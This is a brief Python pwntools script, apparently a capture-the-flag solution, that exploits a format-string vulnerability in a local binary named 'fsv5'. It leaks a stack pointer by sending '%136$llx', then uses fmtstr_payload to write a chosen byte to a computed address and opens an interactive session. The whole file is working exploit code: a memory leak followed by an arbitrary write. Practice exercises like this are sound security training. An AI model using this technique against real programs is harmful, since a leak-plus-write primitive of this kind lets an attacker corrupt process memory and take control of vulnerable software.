#!/bin/python

from pwn import *

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

io = gdb.debug('./fsv5', gdbscript = '''
    b main
    c
        ''')
#io = process('./fsv5');

io.sendline(b'%136$llx');
base_ptr = int(io.recvline(), 16);

log.info("Base pointer: " + hex(base_ptr));

payload = pwnlib.fmtstr.fmtstr_payload(6, { 
        (base_ptr - 0x11): (0x41),
    }, write_size='byte');

log.info("Payload: " + str(payload));
io.sendline(payload)

io.interactive()
